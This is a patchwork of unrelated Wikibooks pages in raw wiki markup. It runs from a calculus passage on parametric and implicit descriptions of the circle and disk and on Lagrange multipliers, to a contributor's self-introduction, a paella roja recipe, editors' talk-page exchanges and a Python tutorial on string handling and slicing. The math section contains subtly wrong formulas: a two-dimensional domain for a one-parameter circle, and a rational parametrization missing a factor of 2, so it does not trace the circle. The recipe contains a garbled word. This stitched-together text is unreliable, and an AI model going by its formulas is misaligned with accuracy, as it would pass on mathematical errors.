An explicit presentation expresses a set as the ''image'' of a function, &lt;math&gt;X \to \mathbf{R}^n,&lt;/math&gt; most often the image of a function from another Euclidean space or cube, &lt;math&gt;\mathbf{R}^k \to \mathbf{R}^n&lt;/math&gt; or &lt;math&gt;[0,1]^k \to \mathbf{R}^n.&lt;/math&gt; This function can be interpreted as a vector-valued function with ''k'' inputs and ''n'' outputs.

An implicit presentation expresses a set as the ''pre-image'' of a function or functions, &lt;math&gt;\mathbf{R}^n \to Y,&lt;/math&gt; most often the pre-image of a function to another Euclidean space &lt;math&gt;\mathbf{R}^n \to \mathbf{R}^k,&lt;/math&gt; which can be interpreted as ''k'' separate real-valued functions (each with ''n'' inputs), or as a single vector-valued function in ''n'' inputs. Implicit presentations generally present subsets as ''[[w:level set|level set]]s'' or ''[[w:sublevel set|sublevel set]]s:'' via '''equalities''' or '''inequalities''' that elements of a subset must satisfy.

Briefly, explicit presentations ''list'' points, while implicit presentations ''test'' points: in an explicit presentation, as one ranges over the input, one obtains all the output, while in an implicit presentation, one can test possible points to see if they fall in the set: if the satisfy the constraints or not.

One can sometimes convert between these presentations, but in general this can be quite difficult.

=== Example: circle and disk ===
'''Circle:'''
* &lt;math&gt;x^2+y^2=1&lt;/math&gt; is an implicit presentation.
* &lt;math&gt;(\cos \theta, \sin \theta)&lt;/math&gt; for &lt;math&gt;\theta \in [0,1] \times [0,2\pi]&lt;/math&gt; is an explicit presentation.
* &lt;math&gt;\left(\frac{1-t^2}{1+t^2},\frac{t}{1+t^2}\right)&lt;/math&gt; for &lt;math&gt;t \in \mathbf{R}&lt;/math&gt; is an explicit presentation.

'''Disk:'''
* &lt;math&gt;x^2+y^2 \leq 1&lt;/math&gt; is an implicit presentation
* &lt;math&gt;(r \cos \theta, r \sin \theta)&lt;/math&gt; for &lt;math&gt;(r,\theta) \in [0,1] \times [0,2\pi]&lt;/math&gt; is an explicit presentation.
* &lt;math&gt;\left(u\frac{1-t^2}{1+t^2},u\frac{t}{1+t^2}\right)&lt;/math&gt; for &lt;math&gt;t \in \mathbf{R}, u \in [0,1]&lt;/math&gt; is an explicit presentation.

Different presentations may be more or less useful.

==== Caveats: Imperfect parametrizations ====
Note that explicit presentations sometimes hit the same point more than once (in the first presentation of the circle, &lt;math&gt;\theta = 0&lt;/math&gt; and &lt;math&gt;\theta = 2\pi&lt;/math&gt; map to the same point, and in the presentation of the disk, all points with &lt;math&gt;r=0&lt;/math&gt; map to the same point, the origin, &lt;math&gt;(0,0)&lt;/math&gt;), or miss a point (in the second presentation, the point &lt;math&gt;(-1,0)&lt;/math&gt; is not hit by any finite ''t'' – if one extends the domain to include &lt;math&gt;\infty,&lt;/math&gt; then it can be hit by some input). This is often simply a minor technicality to deal with, such as by excluding &lt;math&gt;\theta = 2\pi&lt;/math&gt; or including &lt;math&gt;t=\infty,&lt;/math&gt; or by checking points that are not hit or hit multiply separately and with care. The underlying mathematical issue is that the space being parametrized may not be [[w:homeomorphic|homeomorphic]] or [[w:diffeomorphic|diffeomorphic]] to the space being used to parameterize: one says that there is a &quot;[[w:topology|topological]] obstruction&quot; to giving a parametrization without these imperfections.

One need not in general concern oneself with the details of the topology, and topology is a major field of mathematics,
but, as with the [[w:boundedness principle|boundedness principle]] and the [[w:maximum principle|maximum principle]], topological theories underlie much of why calculus optimization methods work.

One topological, or more precisely geometric, observation that is worth mentioning, however, is that in many applications, the subset being considered is a [[w:convex set|convex set]] – it bulges out, not in, and, further, is connected (in one piece) and does not have holes in the middle. In these settings, the shape is topologically a disk or in higher dimensions a ''[[w:n-sphere|ball]],'' and one 
can thus talk about the interior of a shape (the ''open ''n''-ball''), and a single boundary, which will topologically be a simple sphere (the (&lt;math&gt;n-1&lt;/math&gt;)-sphere) rather than something more complicated. Thus there is little loss in generality of bearing the disk in mind as the archetypal example of a subset in thinking about these problems.

=== Explicit: parametrization ===
A set may be given explicitly by a parametrization, such as by a [[w:parametric equation|parametric equation]] in 1 parameter for a curve, or a [[w:parametric surface|parametric surface]] (parametric equation in 2 parameters).

=== Implicit: constraints ===
* Equality constraints
* Inequality constraints

== Discussion ==
When finding the extreme values of &lt;math&gt;f(x_1,x_2,\cdots, x_n)&lt;/math&gt; subject to a constraint &lt;math&gt;g(x_1,x_2,\cdots, x_n)=k&lt;/math&gt;, the stationary points found above will not work. This new problem can be thought of as finding extreme values of &lt;math&gt;f(x_1,x_2,\dots, x_n)&lt;/math&gt; when the point &lt;math&gt;(x_1,x_2,\dots, x_n) &lt;/math&gt; is restricted to lie on the surface &lt;math&gt; g(x_1,x_2,\dots, x_n)=k &lt;/math&gt;. The value of &lt;math&gt;f(x_1,x_2,\dots, x_n) &lt;/math&gt; is maximized(minimized) when the surfaces touch each other,''i.e'' , they have a common [[Tangent|tangent line]]. This means that the surfaces gradient vectors at that point are parallel, hence,

:  &lt;math&gt;\nabla f(x_1,x_2,\cdots, x_n) = \lambda \nabla g(x_1,x_2,\cdots, x_n) .&lt;/math&gt;

The number &lt;math&gt;\lambda &lt;/math&gt; in the equation is known as the Lagrange multiplier.

      <text xml:space="preserve">== Introduction: Pcfjr9 and A New Visualization of The Atom ==

Hi everyone. I wrote the WikiBook [[A_New_Model_of_the_Atom]] last year. It's A New Visualization of The Atom. A new way to view, teach, and understand the basics of atoms, and how they interact to form molecules. I didn't introduce myself earlier as I'm just now learning my way around Wiki. I am an electrical engineer by training and a Wannabe Renaissance Man by armchair. Originally from Northern Virginia, I moved to the Silicon Valley 25+ years ago to work and raise my family. My kids think my knowledge is like an ocean that covers the earth. But, I'll add that such a notion is a shallow ocean.
   
As my kids (they are twins) went through school they had a lot of trouble understanding the atom. They found my explanations made this difficult subject much more comprehensible than what they received in science class. Once I got my analogy of atomic theory into their heads, my children could “see” how pressure and heat can turn carbon to diamond, why the transformation increases carbon’s density, and why the diamond bonds are so strong. They can now understand the chemistry of why mayonnaise emulsifies oil with vinegar. I didn’t get that understanding from 8th grade science and chemistry, nor even high school. They were often far ahead of their classmates in many areas of middle and high school. From a class of 900, I like to think I had something to do with the payoff of watching them walk to the podium to receive awards at graduation. Their names were announced 21 times from the graduation program pamphlet. Now in college, they have told me that my explanations, on a multitude of subjects, have often placed them significantly ahead of classmates. They ask me to write a book, so this is its beginning.

[[A_New_Model_of_the_Atom]] is intended for intermediate and high school students (or any non-physicist adult) desiring a better understanding of atoms and how they create molecules. I welcome constructive criticism. Please let me know if parts are unclear or need expansion. If readers find this useful, I'll add more ways to understand some complex issues without math. I'd like to expand upon the duality of light and add some drawings to the &quot;Double-Slit&quot; experiment. Some other possible subjects include:
 
:&quot;How Neutrinos Can Travel Through a Wall of Lead One Light Year Thick&quot; 
:&quot;How a Teaspoon of Neutrons can Weigh 1 Billion Tons&quot;
:&quot;How Dark Matter and Dark Energy Could Give Shape to the Cosmos&quot;
:&quot;Why One Cannot Make an Electrical Generator Big Enough to Run an Electric Motor to Run the Generator&quot;

Please leave comments on the discussion page. Thanks &lt;&lt; [[User:Pcfjr9|Pcfjr9]] ([[User talk:Pcfjr9|talk]]) 21:41, 22 March 2009 (UTC)</text>

{{recipe}} | [[Cookbook:Cuisine of Spain|Cuisine of Spain]] | [[Cookbook:Rice Recipes|Rice Recipes]]

[[Cookbook:Mastering the Art of Cooking Paellas|Paella]] is a Spanish-cuisine rice dish that derives its name from the utensil used to prepare it, a ''paellera''—a flat round pan with two handles. '''''Paella roja''''' is a classic version of mixed paella in Spain (not including the Valencian region). Paella aficionados refer to it as '''mixed''' because it combines meat from land animals with seafood. The recipe below is based on the one displayed on Spain-recipes.com&lt;ref&gt;[http://www.spain-recipes.com/red-paella.html Red paella recipe on Spain-recipes.com]&lt;/ref&gt; but with more ingredients. 

This lightly seasoned dish takes its name from sweet-roasted, red bell peppers and tomatoes. A chicken and seafood broth enhances this paella's flavors as well. 

''Paella roja'' requires some time to prepare but it's well worth the effort.

==Cleaning and eating mussels==
This recipe calls for live mussels. Please read [[cookbook:Bivalve Preparation|these safety guidelines]] for buying, eating and cooking live bivalves (mussels and clams).

==Equipment==
*A 38-centimeter (15-inch) ''paellera''
*A 7.6-liter (two-gallon) pot
*A rice skimmer
*A sharp chopping knife for meat and vegetables
*A large serving spoon
*A [[Cookbook:Potato Masher|potato masher]]
*A clean, white towel large enough to cover the ''paellera''
*A wide heating source such as:  
:#A stove large enough to accommodate the size of the ''paellera''
:#A [http://www.deliciasdeespana.com/store1/shopexd.asp?id=313 gas burner] designed specifically for ''paelleras'' 
:#A charcoal barbecue 
:#A low, forged steel tripod to support the ''paellera'' over a wood or charcoal fire
:#Cinder blocks or heat-resistant bricks to support the ''paellera'' over a wood or charcoal fire

==Recipe==
'''Please read ''[[cookbook:paella cooking techniques|Paella cooking techniques]]'' before attempting this recipe.'''
===Ingredients===
====Broth====
*225 grams (½ pound) [[cookbook:chicken|chicken]] wings
*225 grams (½ pound) of any of the following: frouncesen seafood mix; fish heads; whole [[cookbook:crab|crabs]]; [[cookbook:shrimp|shrimp]] heads;  [[wikipedia:smelt|smelts]]
*1 medium [[cookbook:onion|onion]]
*1 green [[cookbook:Bell Pepper|bell pepper]]
*3 [[cookbook:garlic|garlic cloves]]
*3.8 liters (1 gallon) of water
*2 [[Cookbook:Bay Leaf|bay leaves]]

====Paella====
*[[cookbook:Olive Oil|olive oil]]
*1½ to 2 red bell peppers cut into strips
*Salt to taste
*340 grams (12 ounces) boneless chicken breast or chicken tenderloins
*6 large garlic cloves, diced
*225 grams (8 ounces) onion, diced
*450 grams (1 pound) red bell pepper, diced
*1 pound [[cookbook:tomato|tomatoes]] diced
*1 tablespoon sweet [[cookbook:paprika|paprika]] 
*225 grams (6 ounces) of canned beans (optional), thoroughly rinsed and  strained; Use any of the following: [[cookbook:chickpea|chickpeas]]; [[cookbook:Butter Bean|butter beans]]; great northern beans; [[cookbook:Lima Bean|lima beans]]. ''Note: '''Never''' use stewed beans.''
*720 milliliters (2½ cups) Valencian [[cookbook:rice|rice]]
*1½ tablespoons food coloring for yellow rice; (See note below.)
*340 grams (12 ounces) [[cookbook:squid|squid]] mantles (diced or cut into rings), or 340 grams (12 ounces) [[cookbook:shrimp|shrimp]]
*340 grams (12 ounces) [[cookbook:scallop|scallops]]
*24 live [[cookbook:mussel|mussels]], cleaned with beards removed
''Note: Throughout history, [[cookbook:saffron|saffron]] has been the natural ingredient used in Spain to color rice yellow. However, it's very expensive (a pound costs over US$1,500) because it's labor intensive to process and each saffron [[Horticulture/Crocus|crocus]] yields a minuscule amount of saffron. Consequently, supermarkets sell only a few grams per container for three or four US dollars. The best solution to this problem is to use commercially manufactured food coloring containing both natural and artificial ingredients (but usually no saffron). The two most popular US brands are Bijol and Badia. These companies sell containers each holding several ounces of coloring for less than five US dollars.''

===Procedure===
====Broth====
#Fill a pan with about an inch of water. Bring to a slow boil and add the mussels. Cover the pan and wait about two minutes. Remove the open mussels. Continue checking for open mussels about once every minute. Throw out the ones that won’t open but SAVE THE WATER. Twist off the half shells without meat and discard. Put the half shells with meat in the fridge until you're ready to put them on the paella.
#Cut one onion and one bell pepper into quarters and place them in a large pot with the rest of the broth ingredients including the water from the previous step.
#Boil it down until you've got about a half gallon of broth. Occasionally press the ingredients against the bottom of the pot with the potato masher to squeeze out their flavors. 
#Strain the broth and set aside. Discard the boiled seafood and chicken wings. (If you don't like the idea of throwing out food then eat it as a snack but don't include it in the paella. At this point,  it has very little taste after all the boiling).
#Taste the broth. It should have a strong seafood flavor and moderate chicken flavor.

====Paella====
#Cut the red bell pepper into strips. 
#Pour a pool of oil into the center of the ''paellera''. The pool should be about two inches from the edge of the ''paellera'' on all sides. Heat over a high flame.
#Cook the pepper strips just long enough to scorch them. Remove them and set aside.
#Add one half tablespoon of salt to the chicken and [[cookbook:sautéing|sauté]] until golden brown.
#Add the garlic and sauté until it’s brown but be careful not to burn. This step should only take about a minute to 90 seconds.
#Add the tomatoes, paprika, onions and diced peppers. Sauté until all the vegetables are tender. You’ve just made Spanish ''[[cookbook:sofrito|sofrito]]''.
#Add 960 milliliters (four cups) of broth along with the food coloring and another half tablespoon of salt. Mix well.
#Bring the broth to a rolling boil then lower the heat a bit to allow the broth to [[Cookbook:simmering|simmer]] for about two minutes.
#Taste the broth and invite your dinner guests to do so as well. (This is a custom in Spain.) The broth should have a very lightly salted flavor.
#Add the rice and mix well. Once again, bring the broth to a rolling boil then reduce the heat to create a moderate simmer.
#Frequently mix the ingredients well to prevent burning. Begin tasting the rice after it's been simmering for about 20 minute and reduce the heat a bit. Make sure the rice doesn't get too soft. Check the rice again every 10 minutes and reduce the heat slightly after each taste. Your goal is to wind up with rice that has a slightly underdone center. The time it takes to reach this point can vary from 30 minutes to an hour depending on your cooking gear.
#Add the seafood (except for the mussels) along with the beans and cover it all with rice. Allow the paella to simmer for 10 more minutes. Don't mix the ingredients during this final phase.
#Your paella is done once you've accomplished the following three things: A) The rice should be slightly firm to the bite. Italians use the same approach when cooking pasta. They call this texture ''[[Cookbook:Al dente|al dente]]''. B) The paella should be a little moist but not soupy. C) You should have a bit of toasted rice on the bottom of the ''paellera''. This is considered a delicacy throughout the Spanish-speaking world. Once you've accomplished all of this, your paella is done.
#Remove the ''paellaera'' from the heat and cover it with a clean, white towel (NOT ALUMINUM FOIL). Then allow it to sit for five minutes. This will give the rice some time to absorb more water.
#Remove the towel and place the mussels around the edge of the ''paellera'' with the round edges facing down and push them down into the rice. (If your mussels have become very cold from sitting in the fridge then heat them in a microwave oven for no more than 30 seconds.) Arrange the pepper strips on top of the paella like spokes in a wheel. Your paella is now ready to serve.

Hi, could you explain why you would like the page you created [[Cookbook:Red paella (mixed)]] deleted please? I know it is a copy of another page you created, but that one has the wrong name and has been redirected to the one you are requesting to be deleted. Is your intention to remove this recipe, or just to tidy things up so there is only one copy? Can I presume [[Cookbook:Red chicken and seafood paella]] is the one you want to keep?
Thanks &lt;font color=&quot;#E66C2C&quot;&gt;[[User:QuiteUnusual|'''Unusual? Quite''']]&lt;/font&gt; &lt;sup&gt;&lt;font color=&quot;#306754&quot;&gt;[[User talk:QuiteUnusual|TalkQu]]&lt;/font&gt;&lt;/sup&gt; 22:45, 22 March 2009 (UTC)

:Ah, I see you have changed it to a redirect now - so no need for a deletion. Thanks. In future you would find it easier if you just moved the page to the new name you wanted.

== Hello ==

Please don't spam user talk pages as you did with the notice about [[WB:RFP]] - that is considered extremely poor form. Those who care about the request will see it. In any case, no &quot;support&quot; is needed for that request, so the notices are pointless. &amp;nbsp;'''&amp;mdash;&amp;nbsp;[[User:Mike.lifeguard|&lt;b style=&quot;color:#309;&quot;&gt;Mike.lifeguard&lt;/b&gt;]]'''&amp;nbsp;&amp;#124;&amp;nbsp;&lt;sup&gt;[[User talk:Mike.lifeguard|&lt;span style=&quot;color:#309;&quot;&gt;talk&lt;/span&gt;]]&lt;/sup&gt; 04:26, 30 August 2009 (UTC)

== Cookbook name casing ==

I noticed you moved a recipe to a sentence-case name.  Looking through the recipes in the cookbook, I see a lot with title-case names and few with sentence-case names.  While books are consistently made with title-case names, I see that [[Cookbook:Policy#Naming_Conventions]] states that recipes should be title-case as well.  If you have a strong objection to this it may be beneficial to see how others feel on the talk page for that policy or in the reading room, otherwise you and other contributors to the cookbook will be working against each other. -- [[User:Adrignola|Adrignola]] &lt;sup&gt;[[User talk:Adrignola|talk]] [[Special:Contributions/Adrignola|contribs]]&lt;/sup&gt; 16:13, 17 November 2009 (UTC)
:I'm a little confused. Are you saying it's Wikibook policy to capitalize each noun in the name of the recipe page? [[User:Moby-Dick4000|Moby-Dick4000]] ([[User talk:Moby-Dick4000|talk]]) 18:39, 17 November 2009 (UTC)
::It sure looks to be the case from the [[Cookbook:Policy]] page.  It does say that the convention is &quot;de-facto&quot; so that may mean that there wasn't a formal process in deciding this.  I would think it came about to match the name casing of the textbooks in the main namespace but this was before my time here. -- [[User:Adrignola|Adrignola]] &lt;sup&gt;[[User talk:Adrignola|talk]] [[Special:Contributions/Adrignola|contribs]]&lt;/sup&gt; 18:50, 17 November 2009 (UTC)
:::Yes I just read the policy. You seem to be right. I'll start using title case from now on. When I have the time, I'll remove the redirects I did that changed the recipe title casing. However, I have noticed many recipes that use sentence casing as I did, so this policy is not very well known among the contributors.

      <text xml:space="preserve">&lt;!-- things to talk about: chr ord float int len repr s+b s[i] s[i:j] s*n find rfind replace strip --&gt;
&lt;!-- Start with indexing, user chr and ord to show how to do manual int&lt;-&gt;string --&gt;
&lt;!-- Repeate the &lt;B&gt; with slices and do actual html --&gt;
&lt;!-- Do some more phrasing --&gt;
&lt;!----&gt;
&lt;!-- Okay here is todays typing exercise: --&gt;
&lt;!-- &lt;source lang=&quot;python&quot;&gt; --&gt;
&lt;!-- def to_string(in_int): --&gt;
&lt;!--     &quot;Converts an integer to a string&quot; --&gt;
&lt;!--     out_str = &quot;&quot; --&gt;
&lt;!--     prefix = &quot;&quot; --&gt;
&lt;!--     if in_int &lt; 0: --&gt;
&lt;!--         prefix = &quot;-&quot; --&gt;
&lt;!--         in_int = -in_int         --&gt;
&lt;!--     while in_int / 10 != 0: --&gt;
&lt;!--         out_str = chr(ord('0')+in_int % 10) + out_str --&gt;
&lt;!--         in_int = in_int / 10 --&gt;
&lt;!--     out_str = chr(ord('0')+in_int % 10) + out_str --&gt;
&lt;!--     return prefix + out_str --&gt;
&lt;!--  --&gt;
&lt;!-- def to_int(in_str): --&gt;
&lt;!--     &quot;Converts a string to an integer&quot; --&gt;
&lt;!--     out_num = 0 --&gt;
&lt;!--     if in_str[0] == &quot;-&quot;: --&gt;
&lt;!--         multiplier = -1 --&gt;
&lt;!--         in_str = in_str[1:] --&gt;
&lt;!--     else: --&gt;
&lt;!--         multiplier = 1 --&gt;
&lt;!--     for x in range(0,len(in_str)): --&gt;
&lt;!--         out_num = out_num * 10 + ord(in_str[x]) - ord('0') --&gt;
&lt;!--     return out_num * multiplier --&gt;
&lt;!--  --&gt;
&lt;!-- print to_string(2) --&gt;
&lt;!-- print to_string(23445) --&gt;
&lt;!-- print to_string(-23445) --&gt;
&lt;!-- print to_int(&quot;14234&quot;) --&gt;
&lt;!-- print to_int(&quot;12345&quot;) --&gt;
&lt;!-- print to_int(&quot;-3512&quot;) --&gt;
&lt;!-- &lt;/source&gt; --&gt;
&lt;!-- The output is: --&gt;
&lt;!-- &lt;source lang=&quot;python&quot;&gt; --&gt;
&lt;!-- 2 --&gt;
&lt;!-- 23445 --&gt;
&lt;!-- -23445 --&gt;
&lt;!-- 14234 --&gt;
&lt;!-- 12345 --&gt;
&lt;!-- -3512 --&gt;
&lt;!-- &lt;/source&gt; --&gt;
&lt;!--  --&gt;
&lt;!-- So how does it work?  The first detail to notice is that it defines two different functions, one that converts a string to a number and one that converts a number to a string.  Notice that this function does string manipulation similar to how lists can be manipulated.  For example the line &lt;code&gt;if in_str[0] == &quot;-&quot;&lt;/code&gt; uses indexing to look at the first letter in the string.  Another thing that strings can do that lists can is using slices.  The line &lt;code&gt;in_str = in_str[1:]&lt;/code&gt; uses slices to get all but the first character of in_str (or drops the first letter).  However you cannot use slices or indexing to assign to a letter or location in a string. --&gt;
&lt;!--  --&gt;
&lt;!-- Two new things to introduced are the functions &lt;code&gt;ord&lt;/code&gt; and &lt;code&gt;chr&lt;/code&gt;.  The  --&gt;
&lt;!-- &lt;code&gt;ord&lt;/code&gt; function takes a character (a string of length one) and returns the ASCII value of the character.  The function &lt;code&gt;chr&lt;/code&gt; is its inverse and takes a ASCII value and returns a character.  The expression &lt;code&gt;ord(in_str[x]) - ord('0')&lt;/code&gt; uses the &lt;code&gt;ord&lt;/code&gt; function to find the value of a string.  This works since '0' through '9' have ASCII values that are all in a row.  The ASCII value of '0' is 48 and the ASCII value of '9' is 57 so when we subtract 57-48 we get 9 and this works similarly with other numbers.  The expression &lt;code&gt;chr(ord('0')+in_int % 10)&lt;/code&gt; works in a similar manor but in reverse.
--&gt;
And now presenting a cool trick that can be done with strings:
&lt;source lang=&quot;python&quot;&gt;
def shout(string):
    for character in string:
        print(&quot;Gimme a &quot; + character)
        print(&quot;'&quot; + character + &quot;'&quot;)

shout(&quot;Lose&quot;)

def middle(string):
    print(&quot;The middle character is:&quot;, string[len(string) // 2])

middle(&quot;abcdefg&quot;)
middle(&quot;The Python Programming Language&quot;)
middle(&quot;Atlanta&quot;)
&lt;/source&gt;

And the output is:

 Gimme a L
 'L'
 Gimme a o
 'o'
 Gimme a s
 's'
 Gimme a e
 'e'
 The middle character is: d
 The middle character is: r
 The middle character is: a

What these programs demonstrate is that strings are similar to lists in several ways.  The &lt;code&gt;shout()&lt;/code&gt; function shows that &lt;code&gt;for&lt;/code&gt; loops can be used with strings just as they can be used with lists.  The &lt;code&gt;middle&lt;/code&gt; procedure shows that that strings can also use the &lt;code&gt;len()&lt;/code&gt; function and array indexes and slices.  Most list features work on strings as well.

The next feature demonstrates some string specific features:
&lt;source lang=&quot;python&quot;&gt;
def to_upper(string):
    ## Converts a string to upper case
    upper_case = &quot;&quot;
    for character in string:
        if 'a' &lt;= character &lt;= 'z':
            location = ord(character) - ord('a')
            new_ascii = location + ord('A')
            character = chr(new_ascii)
        upper_case = upper_case + character
    return upper_case

print(to_upper(&quot;This is Text&quot;))
&lt;/source&gt;

with the output being:

 THIS IS TEXT

This works because the computer represents the characters of a string as numbers from 0 to 1,114,111.  For example 'A' is 65, 'B' is 66 and א is 1488. The values are the [[w:en:unicode|unicode]] value.  Python has a function called &lt;code&gt;ord()&lt;/code&gt; (short for ordinal) that returns a character as a number.  There is also a corresponding function called &lt;code&gt;chr()&lt;/code&gt; that converts a number into a character.  With this in mind the program should start to be clear.  The first detail is the line: &lt;code&gt;if 'a' &lt;= character &lt;= 'z':&lt;/code&gt; which checks to see if a letter is lower case.  If it is then the next lines are used.  First it is converted into a location so that a&amp;nbsp;=&amp;nbsp;0, b&amp;nbsp;=&amp;nbsp;1, c&amp;nbsp;=&amp;nbsp;2 and so on with the line: &lt;code&gt;location = ord(character) - ord('a')&lt;/code&gt;.  Next the new value is found with &lt;code&gt;new_ascii = location + ord('A')&lt;/code&gt;.  This value is converted back to a character that is now upper case.  Note that if you really need the upper case of a letter, you should use &lt;code&gt;u=var.upper()&lt;/code&gt; which will work with other languages as well.  

Now for some interactive typing exercise:

 &gt;&gt;&gt; '''# Integer to String'''
 &gt;&gt;&gt; '''2'''
 2
 &gt;&gt;&gt; '''repr(2)'''
 '2'
 &gt;&gt;&gt; '''-123'''
 -123
 &gt;&gt;&gt; '''repr(-123)'''
 '-123'
 &gt;&gt;&gt; '''# String to Integer'''
 &gt;&gt;&gt; '''&quot;23&quot;'''
 '23'
 &gt;&gt;&gt; '''int(&quot;23&quot;)'''
 23
 &gt;&gt;&gt; '''&quot;23&quot; * 2'''
 '2323'
 &gt;&gt;&gt; '''int(&quot;23&quot;) * 2'''
 46
 &gt;&gt;&gt; '''# Float to String'''
 &gt;&gt;&gt; '''1.23'''
 1.23
 &gt;&gt;&gt; '''repr(1.23)'''
 '1.23'
 &gt;&gt;&gt; '''# Float to Integer'''
 &gt;&gt;&gt; '''1.23'''
 1.23
 &gt;&gt;&gt; '''int(1.23)'''
 1
 &gt;&gt;&gt; '''int(-1.23)'''
 -1
 &gt;&gt;&gt; '''# String to Float'''
 &gt;&gt;&gt; '''float(&quot;1.23&quot;)'''
 1.23
 &gt;&gt;&gt; '''&quot;1.23&quot;''' 
 '1.23'
 &gt;&gt;&gt; '''float(&quot;123&quot;)'''
 123.0

If you haven't guessed already the function &lt;code&gt;repr()&lt;/code&gt; can convert an integer to a string and the function &lt;code&gt;int()&lt;/code&gt; can convert a string to an integer. The function &lt;code&gt;float()&lt;/code&gt; can convert a string to a float.  The &lt;code&gt;repr()&lt;/code&gt; function returns a printable representation of something. Here are some examples of this:

 &gt;&gt;&gt; '''repr(1)'''
 '1'
 &gt;&gt;&gt; '''repr(234.14)'''
 '234.14'
 &gt;&gt;&gt; '''repr([4, 42, 10])'''
 '[4, 42, 10]'

The &lt;code&gt;int()&lt;/code&gt; function tries to convert a string (or a float) into an integer.  There is also a similar function called &lt;code&gt;float()&lt;/code&gt; that will convert a integer or a string into a float.  Another function that Python has is the &lt;code&gt;eval()&lt;/code&gt; function.  The &lt;code&gt;eval()&lt;/code&gt; function takes a string and returns data of the type that python thinks it found.  For example:

 &gt;&gt;&gt; '''v = eval('123')'''
 &gt;&gt;&gt; '''print(v, type(v))'''
 123 &lt;type 'int'&gt;
 &gt;&gt;&gt; '''v = eval('645.123')'''
 &gt;&gt;&gt; '''print(v, type(v))'''
 645.123 &lt;type 'float'&gt;
 &gt;&gt;&gt; '''v = eval('[1, 2, 3]')'''
 &gt;&gt;&gt; '''print(v, type(v))'''
 [1, 2, 3] &lt;type 'list'&gt;

If you use the &lt;code&gt;eval()&lt;/code&gt; function you should check that it returns the type that you expect.

One useful string function is the &lt;code&gt;split()&lt;/code&gt; method. Here's an example:

 &gt;&gt;&gt; '''&quot;This is a bunch of words&quot;.split()'''
 ['This', 'is', 'a', 'bunch', 'of', 'words']
 &gt;&gt;&gt; '''text = &quot;First batch, second batch, third, fourth&quot;'''
 &gt;&gt;&gt; '''text.split(&quot;,&quot;)'''
 ['First batch', ' second batch', ' third', ' fourth']

Notice how &lt;code&gt;split()&lt;/code&gt; converts a string into a list of strings.  The string is split by whitespace by default or by the optional argument (in this case a comma).
You can also add another argument that tells &lt;code&gt;split()&lt;/code&gt; how many times the separator will be used to split the text. For example:

 &gt;&gt;&gt; '''list = text.split(&quot;,&quot;)'''
 &gt;&gt;&gt; '''len(list)'''
 4
 &gt;&gt;&gt; '''list[-1]'''
 ' fourth'
 &gt;&gt;&gt; '''list = text.split(&quot;,&quot;, 2)'''
 &gt;&gt;&gt; '''len(list)'''
 3
 &gt;&gt;&gt; '''list[-1]'''
 ' third, fourth'

&lt;!-- TODO add more on strings --&gt;
=== Slicing strings (and lists) ===

Strings can be cut into pieces &amp;mdash; in the same way as it was shown for lists in the previous chapter &amp;mdash; by using the ''slicing'' &quot;operator&quot; &lt;tt&gt;[]&lt;/tt&gt;. The slicing operator works in the same way as before: text[first_index:last_index] (in very rare cases there can be another colon and a third argument, as in the example shown below).

In order not to get confused by the index numbers, it is easiest to see them as ''clipping places'', possibilities to cut a string into parts. Here is an example, which shows the clipping places (in yellow) and their index numbers (red and blue) for a simple text string:

&lt;tt&gt;
{| style=&quot;text-align:center&quot; cellspacing=&quot;0px&quot;
|
| style=&quot;width:2ex&quot; |
| style=&quot;width:2ex;color:red&quot; |0
| style=&quot;width:2ex&quot; |
| style=&quot;width:2ex;color:red&quot; |1
| style=&quot;width:2ex&quot; |
| style=&quot;width:2ex;color:red&quot; |2
| style=&quot;width:2ex&quot; |
| style=&quot;width:2ex&quot; | ...
| style=&quot;width:2ex&quot; |
| style=&quot;width:2ex;color:blue&quot; | -2
| style=&quot;width:2ex&quot; |
| style=&quot;width:2ex;color:blue&quot; | -1
| style=&quot;width:2ex&quot; |
| style=&quot;width:2ex&quot; |
| style=&quot;width:2ex&quot; |
|-
|
|
| style=&quot;background:#FFFF88&quot; |&amp;darr;
|
| style=&quot;background:#FFFF88&quot; |&amp;darr;
|
| style=&quot;background:#FFFF88&quot; |&amp;darr;
|
| style=&quot;background:#FFFF88&quot; |&amp;darr;
|
| style=&quot;background:#FFFF88&quot; |&amp;darr;
|
| style=&quot;background:#FFFF88&quot; |&amp;darr;
|
| style=&quot;background:#FFFF88&quot; |&amp;darr;
|
|-
| text = 
|&quot;
| style=&quot;background:#FFFF88&quot; |
!S 
| style=&quot;background:#FFFF88&quot; |
!T
| style=&quot;background:#FFFF88&quot; |
!R
| style=&quot;background:#FFFF88&quot; |
!I
| style=&quot;background:#FFFF88&quot; |
!N
| style=&quot;background:#FFFF88&quot; |
!G
| style=&quot;background:#FFFF88&quot; |
|&quot;
|-
|
|
| style=&quot;background:#FFFF88&quot; |&amp;uarr;
|
| style=&quot;background:#FFFF88&quot; |
|
| style=&quot;background:#FFFF88&quot; |
|
| style=&quot;background:#FFFF88&quot; |
|
| style=&quot;background:#FFFF88&quot; |
|
| style=&quot;background:#FFFF88&quot; |
|
| style=&quot;background:#FFFF88&quot; |&amp;uarr;
|
|-
|
|
|[:
|
|
|
|
|
|
|
|
|
|
|
|:]
|
|}
&lt;/tt&gt;

Note that the red indexes are counted from the beginning of the string and the blue ones from the end of the string backwards. (Note that there is no blue -0, which could seem to be logical at the end of the string. Because &lt;tt&gt;-0 == 0&lt;/tt&gt;, -0 means &quot;beginning of the string&quot; as well.)  Now we are ready to use the indexes for slicing operations:

&lt;tt&gt;
{|
|-
|text[1:4] || style=&quot;width:3em;text-align:center&quot; | &amp;rarr; || &quot;TRI&quot;
|-
|text[:5] || style=&quot;width:3em;text-align:center&quot; | &amp;rarr; || &quot;STRIN&quot;
|-
|text[:-1] || style=&quot;width:3em;text-align:center&quot; | &amp;rarr; || &quot;STRIN&quot;
|-
|text[-4:] || style=&quot;width:3em;text-align:center&quot; | &amp;rarr; || &quot;RING&quot;
|-
|text[2] || style=&quot;width:3em;text-align:center&quot; | &amp;rarr; || &quot;R&quot;
|-
|text[:] || style=&quot;width:3em;text-align:center&quot; | &amp;rarr; || &quot;STRING&quot;
|-
|text[::-1] || style=&quot;width:3em;text-align:center&quot; | &amp;rarr; || &quot;GNIRTS&quot;
|}
&lt;/tt&gt;

